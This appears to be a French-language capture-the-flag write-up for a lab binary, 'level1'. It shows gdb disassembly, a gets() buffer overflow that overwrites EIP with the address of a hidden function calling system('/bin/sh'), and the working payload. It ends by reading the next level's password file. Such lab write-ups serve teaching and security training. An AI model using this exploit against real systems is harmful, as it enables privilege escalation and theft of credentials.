$ gdb level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:		push   ebp
   0x08048481 <+1>:		mov    ebp,esp
   0x08048483 <+3>:		and    esp,0xfffffff0
   0x08048486 <+6>:		sub    esp,0x50 <--------- Buffer de 80
   0x08048489 <+9>:		lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.

Juste un appel a gets() et quitte

(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets@plt
0x08048350  fwrite@plt
0x08048360  system@plt
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run <---------------------- Fonction maison pas appelée dans le main
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:		push   ebp
   0x08048445 <+1>:		mov    ebp,esp
   0x08048447 <+3>:		sub    esp,0x18
   0x0804844a <+6>:		mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt> <------- Appel à system
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.

$ strings level1
...
/bin/sh
...

Surement un system("/bin/sh")

scp et decompile avec ghidra (Cutter) confirme
En decompilant on voit un buffer a 76, les 80 c'etait surement avec du padding

On test en envoyant plus de 76 caracteres

$ python -c "print 'a'*77" | ./level1
Segfault

On ouvre avec gdb-peda et on essaye de mettre 4 octets de plus pour ecraser EIP

python -c 'print "a"*80' > payload
$ (gdb) run < file
...
EIP: 0x61616161 ('aaaa')
...

Good, on peut balancer l'adresse de la fonction run dans EIP pour quelle soit executée
Inversée parce qu'on est en little endian

$ python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/payload

$ cat /tmp/payload | ./level1
Good... Wait what?
Segfault

La fonction run s'est bien executee mais stdin n'est pas ouverte donc on va enchainer

$ (cat /tmp/payload ; echo whoami) | ./level1
level1
Good... Wait what?
level2
Segmentation fault (core dumped)

$ (cat /tmp/payload ; cat /home/user/level2/.pass) | ./level1

Bingo :)
